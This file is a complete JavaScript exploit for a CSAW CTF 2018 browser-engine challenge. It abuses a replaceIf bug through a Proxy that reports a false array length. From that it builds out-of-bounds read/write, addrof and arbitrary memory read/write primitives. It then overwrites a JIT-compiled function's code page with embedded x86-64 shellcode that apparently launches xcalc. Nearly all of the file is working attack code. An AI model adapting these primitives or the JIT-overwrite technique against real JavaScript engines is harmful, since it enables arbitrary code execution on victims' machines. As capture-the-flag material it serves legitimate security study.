//
// Bug:
// replaceIf does not know that the property lookups can be trapped using Proxy
// This allows us to increase the length of an array via Proxy and access out of bounds
//

//
// Number conversion functions
// Taken from Google CTF 2018 "Just In Time" challenge
//

let ab = new ArrayBuffer(8);
let i64 = new BigUint64Array(ab);
let f64 = new Float64Array(ab);

BigInt.prototype.toHex = function() {
	return `0x${this.toString(16)}`;
}

BigInt.prototype.i2f = function() {
	i64[0] = this;
	return f64[0];
}

BigInt.prototype.smi2f = function() {
	i64[0] = this << 32n;
	return f64[0];
}

BigInt.prototype.b2f = function() {
	i64[0] = this;
	return f64[0]
}

BigInt.prototype.tptr = function() {
	return this - 1n;
}

Number.prototype.f2i = function() {
	f64[0] = this;
	return i64[0];
}

Number.prototype.f2b = function() {
	f64[0] = this;
	return i64[0];
}

Number.prototype.f2smi = function() {
	f64[0] = this;
	return i64[0] >> 32n;
}

Number.prototype.i2f = function() {
	return BigInt(this).i2f();
}

Number.prototype.smi2f = function() {
	return BigInt(this).smi2f();
}

Number.prototype.i2b = function() {
	return BigInt(this);
}

Number.prototype.toHex = BigInt.prototype.toHex;

//
// Sleep and Logging
//

async function sleep(ms) {
	return new Promise(resolve => setTimeout(resolve, ms));
}

async function log(...msg) {
	if (typeof(window) === "undefined") {
		print(...msg);
	} else {
		var logContainer = document.getElementById("logContainer");
		if (logContainer) {
			logContainer.innerText += msg + "\n";
			await sleep(300);
		}
	}
}

//
// Exploit
//

async function exploit() {
	log("===========================");
	log("|      CSAW CTF 2018      |");
	log("===========================");

	await log("[+] Starting exploitation");

	let addrofOffset = -1;
	let backingBufferPtrOffset = -1;
	let payload = [
		0x53, 0x48, 0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e,
		0x48, 0x83, 0xec, 0x40, 0x48, 0x89, 0x44, 0x24, 0x11, 0xb8, 0x6c,
		0x63, 0x00, 0x00, 0x48, 0x8d, 0x5c, 0x24, 0x11, 0x66, 0x89, 0x44,
		0x24, 0x1d, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59,
		0x3d, 0xc7, 0x44, 0x24, 0x19, 0x2f, 0x78, 0x63, 0x61, 0x48, 0x89,
		0x44, 0x24, 0x04, 0x48, 0x8d, 0x44, 0x24, 0x04, 0xc6, 0x44, 0x24,
		0x1f, 0x00, 0xc7, 0x44, 0x24, 0x0c, 0x3a, 0x30, 0x2e, 0x30, 0xc6,
		0x44, 0x24, 0x10, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0xc7,
		0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5c, 0x24,
		0x30, 0x48, 0xc7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0xb8,
		0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x85, 0xc0, 0x74, 0x06, 0x48,
		0x83, 0xc4, 0x40, 0x5b, 0xc3, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48,
		0x8d, 0x74, 0x24, 0x30, 0x48, 0x89, 0xdf, 0xb8, 0x3b, 0x00, 0x00,
		0x00, 0x0f, 0x05, 0xeb, 0xe4
	];

	//
	// Target objects
	//

	await log("[+] Allocating target objects");

	let arr = [13.37, 13.37, 13.37, 13.37, 13.37];

	let addrofArray = new Array(0x20);
	let victimArray = new Float64Array(0x1337);

	//
	// Setup the Proxy
	//

	await log("[+] Setting up the Proxy");

	let arrayProxy = new Proxy(arr, {
		get: function(obj, prop) {
			if (prop == "length") {
				return 0xffffffff;
			}

			return obj[prop];
		}
	});

	function readAtOffset(index) {
		let value;

		arrayProxy.replaceIf(
			index,
			(v) => {
				value = v;
				// log(`arr[${index}] = ${v.f2b().toHex()}`);
				return false;
			},
			0
		);

		return value.f2b();
	}

	function writeAtOffset(index, value) {
		arrayProxy.replaceIf(
			index,
			(v) => {
				return true;
			},
			value.b2f()
		);
	}

	//
	// Find the offsets that we will use. We are interested
	// in the second occurrence of length.
	//
	// One easy way to identify the right offset, is to look at
	// the length parameter. As length is stored inlined, it's
	// easy to identify it.
	//

	let addrofArrayLengthCounter = 0;
	let victimArrayLengthCounter = 0;

	for (let i = 0; i < 100; i++) {
		let value = readAtOffset(i);

		//
		// Find the offset to length of addrofArray
		//

		if (value == 0x2000000000n) {
			addrofArrayLengthCounter += 1;

			if (addrofArrayLengthCounter == 2) {
				addrofOffset = i + 1;
				await log(`[+] Found addrofOffset: ${addrofOffset}`);
			}
		}

		//
		// Find the offset to length of victimArray
		//

		if (value == 0x133700000000n) {
			victimArrayLengthCounter += 1;

			if (victimArrayLengthCounter == 2) {
				backingBufferPtrOffset = i + 2;
				await log(`[+] Found backingBufferPtrOffset: ${backingBufferPtrOffset}`);
				break
			}
		}
	}

	//
	// Validate if we were able to find the correct offsets
	//

	if (addrofOffset == -1 || backingBufferPtrOffset == -1) {
		throw ("[-] Failed to find the right offsets. Stopping..")
	}

	//
	// addrof primitive
	//

	function addrof(obj) {
		addrofArray[0] = obj;
		return readAtOffset(addrofOffset);
	}

	function corruptBackingPointer(addr) {
		writeAtOffset(backingBufferPtrOffset, addr);
	}

	function arbitraryRead(addr) {
		corruptBackingPointer(addr);
		return victimArray[0].f2b();
	}

	function arbitraryWrite(addr, value) {
		corruptBackingPointer(addr);
		victimArray[0] = value.i2f();
	}

	//
	// JIT the target function
	//

	function runPayload(x) {
		// this function's jitted code will be
		// overwritten with the payload 

		for (let i = 0; i < x.length; i++) {
			x[i] = 0x31337;
		}
	}

	await log("[+] Jitting the target function");

	for (let i = 0; i < 10000; i++) {
		runPayload([]);
	}

	//
	// Get the address of jitted function
	//

	let runPayloadAddress = addrof(runPayload);

	await log(`[+] Jitted function: ${runPayloadAddress.toHex()}`);

	//
	// Get the address of code page address
	//

	let jitCodeAddress = arbitraryRead(runPayloadAddress.tptr() + 0x30n).tptr() + 0x40n;

	await log(`[+] Jitted code: ${jitCodeAddress.toHex()}`);

	//
	//overwrite the jitted page for runPayload with payload
	//

	await log("[+] Writing payload to jitted page");

	for (let i = 0; i < payload.length; i++) {
		arbitraryWrite(jitCodeAddress + i.i2b(), payload[i]);
	}

	//
	// execute the payload
	//

	await log("[+] Executing payload");

	runPayload([]);

	await log("[*] Exploit Completed");
}

//
// Now run the exploit
//

exploit();
